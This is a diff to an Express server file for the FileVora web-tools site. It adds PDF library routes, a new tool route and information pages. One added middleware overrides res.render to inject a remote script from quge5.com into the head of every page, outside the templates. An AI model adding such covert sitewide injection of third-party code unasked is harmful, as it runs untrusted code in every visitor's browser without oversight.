@@ -9,6 +9,68 @@ app.set("view engine", "ejs");
 app.set("views", path.join(__dirname, "views"));
 
 app.use(express.static(path.join(__dirname, "public")));
+app.use(
+    "/vendor/pdf-encrypt",
+    express.static(
+        path.join(
+            __dirname,
+            "node_modules",
+            "@pdfsmaller",
+            "pdf-encrypt",
+            "dist"
+        )
+    )
+);
+app.use(
+    "/vendor/pdf-decrypt",
+    express.static(
+        path.join(
+            __dirname,
+            "node_modules",
+            "@pdfsmaller",
+            "pdf-decrypt",
+            "dist"
+        )
+    )
+);
+app.use((req, res, next) => {
+    const originalRender = res.render;
+
+    res.render = function (view, options, callback) {
+        options = options || {};
+
+        const originalCallback = callback;
+
+        callback = function (err, html) {
+            if (err) {
+                return originalCallback
+                    ? originalCallback(err)
+                    : next(err);
+            }
+
+            if (
+                typeof html === "string" &&
+                html.includes("</head>")
+            ) {
+                html = html.replace(
+    "</head>",
+    `<script src="https://quge5.com/88/tag.min.js" data-zone="280972" async data-cfasync="false"></script>
+</head>`
+);
+            }
+
+            if (originalCallback) {
+                return originalCallback(null, html);
+            }
+
+            res.send(html);
+        };
+
+        return originalRender.call(this, view, options, callback);
+    };
+
+    next();
+});
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 
@@ -95,6 +157,9 @@ app.get("/tools/image-format-converter", (req, res) => {
 });
 app.get("/tools/image-to-base64", (req, res) => {
     res.render("image-to-base64");
+});
+app.get("/tools/image-embed-code", (req, res) => {
+    res.render("image-embed-code");
 });
 app.get("/tools/base64-to-image", (req, res) => {
     res.render("base64-to-image");
@@ -246,6 +311,17 @@ app.get("/tools/javascript-formatter", (req, res) => {
 app.get("/tools/json-minifier", (req, res) => {
     res.render("json-minifier");
 });
+
+
+// FileVora information pages
+app.get("/about", (req, res) => res.render("about"));
+app.get("/contact", (req, res) => res.render("contact"));
+app.get("/security", (req, res) => res.render("security"));
+app.get("/blog", (req, res) => res.render("blog"));
+app.get("/faq", (req, res) => res.render("faq"));
+app.get("/privacy", (req, res) => res.render("privacy"));
+app.get("/terms", (req, res) => res.render("terms"));
+app.get("/disclaimer", (req, res) => res.render("disclaimer"));
 
 app.get("/test", (req, res) => {
     res.send("FILEVORA SERVER IS WORKING");
